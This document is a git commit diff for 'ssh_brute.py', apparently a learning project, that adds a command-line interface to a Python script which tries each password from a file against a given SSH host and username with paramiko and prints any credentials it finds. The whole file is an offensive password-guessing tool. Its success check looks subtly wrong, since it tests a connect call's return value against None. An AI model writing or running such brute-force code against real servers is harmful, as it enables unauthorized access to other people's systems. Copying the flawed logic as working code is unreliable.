49143774488dcbba4dcb6553f584b8cfb748b0f1
4d4143 <>
2024-05-13 14:32:54 -0300

    Added main

--- project_3/ssh_brute.py
+++ project_3/ssh_brute.py
@@ -1,5 +1,8 @@
 import paramiko
+import argparse
 
+NOT_CONNECTED = 0
+CONNECTED = 1
 
 #Open and read files containing passwords
 def load_passwords(passwords_input_file):
@@ -21,16 +24,34 @@ def attempt_connection(ssh_client, attempt_ip, attempt_password, attempt_usernam
                                         username=attempt_username)
     if attempt_result == None:
         print(f"[-] Failed attempt! Username: {attempt_username} Password: {attempt_password}")
-        return 0
+        return NOT_CONNECTED
     else:
         print(f"[+] Found valid credentials! Username: {attempt_username} Password: {attempt_password}")
-        return 1
+        return CONNECTED
 
 
 #Start cycling through password list and attempt combination with provided user
 #Have to add username list functionality here.
 def cycle_list(ssh_client, attempt_ip, attempt_password_list, attempt_username):
+
     for password in attempt_password_list:
-        if attempt_connection(ssh_client, attempt_ip, password, attempt_username) == 1:
+        if attempt_connection(ssh_client, attempt_ip, password, attempt_username) == CONNECTED:
             break
         
+def main():
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--ip", help="IP to connect to")
+    parser.add_argument("-iL", "--file", help="File with passswords")
+    parser.add_argument("-u", "--user", help="Username")
+
+    args = parser.parse_args()
+    variables = vars(args)
+
+    ssh_client = paramiko.SSHClient()
+    passwords = load_passwords(variables['file'])
+    cycle_list(ssh_client, variables['ip'], passwords, variables['user'])  
+
+
+if __name__ == '__main__':
+    main()
